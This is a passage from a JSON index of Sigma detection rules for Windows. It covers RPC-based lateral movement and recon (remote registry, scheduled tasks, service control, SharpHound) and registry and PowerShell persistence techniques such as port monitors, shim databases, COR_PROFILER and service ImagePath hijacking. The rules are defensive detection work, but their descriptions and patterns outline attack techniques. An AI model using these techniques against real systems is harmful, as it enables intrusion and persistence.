- 19 - 21 - 22 - 23 - 35 condition: selection falsepositives: - Remote administration of registry values level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_remote_registry_lateral_movement.yml/","tags":["attack.lateral_movement"],"title":"Remote Registry Lateral Movement"},{"categories":null,"contents":"Detects remote RPC calls to collect information\nKnown false-positives Remote administration of registry values References https://attack.mitre.org/tactics/TA0007/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-RRP.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Registry Recon id: d8ffe17e-04be-4886-beb9-c1dd1944b9a8 description: Detects remote RPC calls to collect information references: - https://attack.mitre.org/tactics/TA0007/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-RRP.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:338cd001-2244-31f1-aaaa-900038001003\u0026#34;\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 338cd001-2244-31f1-aaaa-900038001003 filter: OpNum: - 6 - 7 - 8 - 13 - 18 - 19 - 21 - 22 - 23 - 35 condition: selection and not filter falsepositives: - Remote administration of registry values level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_remote_registry_recon.yml/","tags":null,"title":"Remote Registry Recon"},{"categories":null,"contents":"Detects remote RPC calls to create or execute a scheduled task via ATSvc\nKnown false-positives unknown References https://attack.mitre.org/techniques/T1053/ https://attack.mitre.org/tactics/TA0008/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Schedule Task Lateral Movement via ATSvc id: 0fcd1c79-4eeb-4746-aba9-1b458f7a79cb description: Detects remote RPC calls to create or execute a scheduled task via ATSvc references: - https://attack.mitre.org/techniques/T1053/ - https://attack.mitre.org/tactics/TA0008/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.lateral_movement - attack.t1053 - attack.t1053.002 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:1ff70682-0a51-30e8-076d-740be8cee98b\u0026#34;\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 1ff70682-0a51-30e8-076d-740be8cee98b OpNum: - 0 - 1 condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_atsvc_lateral_movement.yml/","tags":["attack.lateral_movement","attack.t1053","attack.t1053.002"],"title":"Remote Schedule Task Lateral Movement via ATSvc"},{"categories":null,"contents":"Detects remote RPC calls to create or execute a scheduled task\nKnown false-positives unknown References https://attack.mitre.org/techniques/T1053/ https://attack.mitre.org/tactics/TA0008/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Schedule Task Lateral Movement via ITaskSchedulerService id: ace3ff54-e7fd-46bd-8ea0-74b49a0aca1d description: Detects remote RPC calls to create or execute a scheduled task references: - https://attack.mitre.org/techniques/T1053/ - https://attack.mitre.org/tactics/TA0008/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.lateral_movement - attack.t1053 - attack.t1053.002 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:86d35949-83c9-4044-b424-db363231fd0c\u0026#34;\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 86d35949-83c9-4044-b424-db363231fd0c OpNum: - 1 - 3 - 4 - 10 - 11 - 12 - 13 - 14 - 15 condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_itaskschedulerservice_lateral_movement.yml/","tags":["attack.lateral_movement","attack.t1053","attack.t1053.002"],"title":"Remote Schedule Task Lateral Movement via ITaskSchedulerService"},{"categories":null,"contents":"Detects remote RPC calls to create or execute a scheduled task via SASec\nKnown false-positives unknown References https://attack.mitre.org/techniques/T1053/ https://attack.mitre.org/tactics/TA0008/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Schedule Task Lateral Movement via SASec id: aff229ab-f8cd-447b-b215-084d11e79eb0 description: Detects remote RPC calls to create or execute a scheduled task via SASec references: - https://attack.mitre.org/techniques/T1053/ - https://attack.mitre.org/tactics/TA0008/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.lateral_movement - attack.t1053 - attack.t1053.002 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:378e52b0-c0a9-11cf-822d-00aa0051e40f\u0026#34;\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f OpNum: - 0 - 1 condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_sasec_lateral_movement.yml/","tags":["attack.lateral_movement","attack.t1053","attack.t1053.002"],"title":"Remote Schedule Task Lateral Movement via SASec"},{"categories":null,"contents":"Detects remote RPC calls to read information about scheduled tasks via SASec\nKnown false-positives unknown References https://attack.mitre.org/tactics/TA0007/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Schedule Task Lateral Movement via SASec id: 0a3ff354-93fc-4273-8a03-1078782de5b7 description: Detects remote RPC calls to read information about scheduled tasks via SASec references: - https://attack.mitre.org/tactics/TA0007/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:378e52b0-c0a9-11cf-822d-00aa0051e40f\u0026#34;\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f filter: OpNum: - 0 - 1 condition: selection and not filter falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_sasec_recon.yml/","tags":null,"title":"Remote Schedule Task Lateral Movement via SASec"},{"categories":null,"contents":"Detects remote RPC calls to read information about scheduled tasks via AtScv\nKnown false-positives unknown References https://attack.mitre.org/tactics/TA0007/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 https://github.com/zeronetworks/rpcfirewall https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Schedule Task Recon via AtScv id: f177f2bc-5f3e-4453-b599-57eefce9a59c description: Detects remote RPC calls to read information about scheduled tasks via AtScv references: - https://attack.mitre.org/tactics/TA0007/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 - https://github.com/zeronetworks/rpcfirewall - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:1ff70682-0a51-30e8-076d-740be8cee98b\u0026#34;\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 1ff70682-0a51-30e8-076d-740be8cee98b filter: OpNum: - 0 - 1 condition: selection and not filter falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_atsvc_recon.yml/","tags":null,"title":"Remote Schedule Task Recon via AtScv"},{"categories":null,"contents":"Detects remote RPC calls to read information about scheduled tasks\nKnown false-positives unknown References https://attack.mitre.org/tactics/TA0007/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Schedule Task Recon via ITaskSchedulerService id: 7f7c49eb-2977-4ac8-8ab0-ab1bae14730e description: Detects remote RPC calls to read information about scheduled tasks references: - https://attack.mitre.org/tactics/TA0007/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:86d35949-83c9-4044-b424-db363231fd0c\u0026#34;\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 86d35949-83c9-4044-b424-db363231fd0c filter: OpNum: - 1 - 3 - 4 - 10 - 11 - 12 - 13 - 14 - 15 condition: selection and not filter falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_itaskschedulerservice_recon.yml/","tags":null,"title":"Remote Schedule Task Recon via ITaskSchedulerService"},{"categories":null,"contents":"Detects remote RPC calls to possibly abuse remote encryption service via MS-SRVS\nKnown false-positives Legitimate remote share creation References https://attack.mitre.org/tactics/TA0008/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-SRVS.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Server Service Abuse id: b6ea3cc7-542f-43ef-bbe4-980fbed444c7 description: Detects remote RPC calls to possibly abuse remote encryption service via MS-SRVS references: - https://attack.mitre.org/tactics/TA0008/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-SRVS.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.lateral_movement status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:4b324fc8-1670-01d3-1278-5a47bf6ee188\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 4b324fc8-1670-01d3-1278-5a47bf6ee188 condition: selection falsepositives: - Legitimate remote share creation level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_remote_server_service_abuse.yml/","tags":["attack.lateral_movement"],"title":"Remote Server Service Abuse"},{"categories":null,"contents":"Detects remote RPC calls to possibly abuse remote encryption service via MS-EFSR\nKnown false-positives Administrative tasks on remote services References https://attack.mitre.org/tactics/TA0008/ https://attack.mitre.org/techniques/T1569/002/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-SCMR.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: Remote Server Service Abuse for Lateral Movement id: 10018e73-06ec-46ec-8107-9172f1e04ff2 description: Detects remote RPC calls to possibly abuse remote encryption service via MS-EFSR references: - https://attack.mitre.org/tactics/TA0008/ - https://attack.mitre.org/techniques/T1569/002/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-SCMR.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.lateral_movement - attack.t1569.002 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:367abb81-9844-35f1-ad32-98f038001003\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 367abb81-9844-35f1-ad32-98f038001003 condition: selection falsepositives: - Administrative tasks on remote services level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_remote_service_lateral_movement.yml/","tags":["attack.lateral_movement","attack.t1569.002"],"title":"Remote Server Service Abuse for Lateral Movement"},{"categories":null,"contents":"Detects remote RPC calls useb by SharpHound to map remote connections and local group membership.\nKnown false-positives Unknown References https://attack.mitre.org/techniques/T1087/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wkst/55118c55-2122-4ef9-8664-0c1ff9e168f3 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-WKST.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: SharpHound Recon Account Discovery id: 65f77b1e-8e79-45bf-bb67-5988a8ce45a5 description: Detects remote RPC calls useb by SharpHound to map remote connections and local group membership. references: - https://attack.mitre.org/techniques/T1087/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wkst/55118c55-2122-4ef9-8664-0c1ff9e168f3 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-WKST.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.t1087 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:6bffd098-a112-3610-9833-46c3f87e345a opnum:2\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 6bffd098-a112-3610-9833-46c3f87e345a OpNum: 2 condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_sharphound_recon_account.yml/","tags":["attack.t1087"],"title":"SharpHound Recon Account Discovery"},{"categories":null,"contents":"Detects remote RPC calls useb by SharpHound to map remote connections and local group membership.\nKnown false-positives Unknown References https://attack.mitre.org/techniques/T1033/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/02b1f559-fda2-4ba3-94c2-806eb2777183 https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-SRVS.md https://github.com/zeronetworks/rpcfirewall https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ Raw rule (edit) title: SharpHound Recon Sessions id: 6d580420-ff3f-4e0e-b6b0-41b90c787e28 description: Detects remote RPC calls useb by SharpHound to map remote connections and local group membership. references: - https://attack.mitre.org/techniques/T1033/ - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/02b1f559-fda2-4ba3-94c2-806eb2777183 - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-SRVS.md - https://github.com/zeronetworks/rpcfirewall - https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/ tags: - attack.t1033 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: \u0026#39;Requirements: install and apply the RPC Firewall to all processes with \u0026#34;audit:true action:block uuid:4b324fc8-1670-01d3-1278-5a47bf6ee188 opnum:12\u0026#39; detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 4b324fc8-1670-01d3-1278-5a47bf6ee188 OpNum: 12 condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/rpc_firewall/rpc_firewall_sharphound_recon_sessions.yml/","tags":["attack.t1033"],"title":"SharpHound Recon Sessions"},{"categories":null,"contents":"Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.010/T1547.010.md Raw rule (edit) title: Add Port Monitor Persistence in Registry id: 944e8941-f6f6-4ee8-ac05-1c224e923c0e description: | Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup. author: frack113 date: 2021/12/30 modified: 2022/02/09 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.010/T1547.010.md logsource: category: registry_event product: windows detection: selection: TargetObject|startswith: \u0026#39;HKLM\\System\\CurrentControlSet\\Control\\Print\\Monitors\\\u0026#39; Details|endswith: \u0026#39;.dll\u0026#39; EventType: SetValue filter_cutepdf: Image: \u0026#39;C:\\Windows\\System32\\spoolsv.exe\u0026#39; TargetObject|contains: \u0026#39;\\System\\CurrentControlSet\\Control\\Print\\Monitors\\CutePDF Writer Monitor v4.0\\Driver\u0026#39; Details: \u0026#39;cpwmon64_v40.dll\u0026#39; User|contains: # covers many language settings - \u0026#39;AUTHORI\u0026#39; - \u0026#39;AUTORI\u0026#39; condition: selection and not 1 of filter_* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.010 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_add_port_monitor.yml/","tags":["attack.persistence","attack.t1547.010"],"title":"Add Port Monitor Persistence in Registry"},{"categories":null,"contents":"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary\u0026rsquo;s executable to launch.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.009/T1574.009.md Raw rule (edit) title: Creation Exe for Service with Unquoted Path id: 8c3c76ca-8f8b-4b1d-aaf3-81aebcd367c9 status: experimental description: | Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary\u0026#39;s executable to launch. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.009/T1574.009.md date: 2021/12/30 logsource: product: windows category: file_event detection: selection: # Feel free to add more TargetFilename: \u0026#39;C:\\program.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.009 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_creation_unquoted_service_path.yml/","tags":["attack.persistence","attack.t1547.009"],"title":"Creation Exe for Service with Unquoted Path"},{"categories":null,"contents":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.011/T1546.011.md#atomic-test-3---registry-key-creation-andor-modification-events-for-sdb https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html Raw rule (edit) title: Registry Key Creation or Modification for Shim DataBase id: dfb5b4e8-91d0-4291-b40a-e3b0d3942c45 description: | Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time author: frack113 date: 2021/12/30 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.011/T1546.011.md#atomic-test-3---registry-key-creation-andor-modification-events-for-sdb - https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html logsource: category: registry_event product: windows detection: selection: TargetObject|startswith: - \u0026#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\\\u0026#39; - \u0026#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\\\u0026#39; EventType: SetValue filter: Details: \u0026#39;\u0026#39; condition: selection and not filter falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1546.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_shim_databases_persistence.yml/","tags":["attack.persistence","attack.t1546.011"],"title":"Registry Key Creation or Modification for Shim DataBase"},{"categories":null,"contents":"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR. (Citation: Microsoft Profiling Mar 2017) (Citation: Microsoft COR_PROFILER Feb 2013)\nKnown false-positives legitimate administrative script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.012/T1574.012.md#atomic-test-3---registry-free-process-scope-cor_profiler Raw rule (edit) title: Registry-Free Process Scope COR_PROFILER id: 23590215-4702-4a70-8805-8dc9e58314a2 status: experimental description: | Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR. (Citation: Microsoft Profiling Mar 2017) (Citation: Microsoft COR_PROFILER Feb 2013) author: frack113 date: 2021/12/30 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.012/T1574.012.md#atomic-test-3---registry-free-process-scope-cor_profiler logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - \u0026#39;$env:COR_ENABLE_PROFILING\u0026#39; - \u0026#39;$env:COR_PROFILER\u0026#39; - \u0026#39;$env:COR_PROFILER_PATH\u0026#39; condition: selection falsepositives: - legitimate administrative script level: medium tags: - attack.persistence - attack.t1574.012 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_cor_profiler.yml/","tags":["attack.persistence","attack.t1574.012"],"title":"Registry-Free Process Scope COR_PROFILER"},{"categories":null,"contents":"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.011/T1574.011.md#atomic-test-2---service-imagepath-change-with-regexe Raw rule (edit) title: Service ImagePath Change with Reg.exe id: 9b0b7ac3-6223-47aa-a3fd-e8f211e637db status: experimental description: | Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.011/T1574.011.md#atomic-test-2---service-imagepath-change-with-regexe author: frack113 date: 2021/12/30 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\reg.exe CommandLine|contains|all: - \u0026#39;add \u0026#39; - \u0026#39;HKLM\\SYSTEM\\CurrentControlSet\\Services\\\u0026#39; - \u0026#39;/v \u0026#39; - \u0026#39;ImagePath \u0026#39; - \u0026#39;/d \u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.persistence - attack.t1574.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_reg_service_imagepath_change.yml/","tags":["attack.persistence","attack.t1574.011"],"title":"Service ImagePath Change with Reg.exe"},{"categories":null,"contents":"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\nKnown false-positives legitimate administrative script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.011/T1574.011.md#atomic-test-1---service-registry-permissions-weakness https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2 Raw rule (edit) title: Service Registry Permissions Weakness Check id: 95afc12e-3cbb-40c3-9340-84a032e596a3 status: experimental description: | Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.011/T1574.011.md#atomic-test-1---service-registry-permissions-weakness - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2 author: frack113 date: 2021/12/30 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - \u0026#39;get-acl\u0026#39; - \u0026#39;REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\\u0026#39; condition: selection falsepositives: - legitimate administrative script level: medium tags: - attack.persistence - attack.t1574.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_get_acl_service.yml/","tags":["attack.persistence","attack.t1574.011"],"title":"Service Registry Permissions Weakness Check"},{"categories":null,"contents":"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.\nKnown false-positives Unknown References 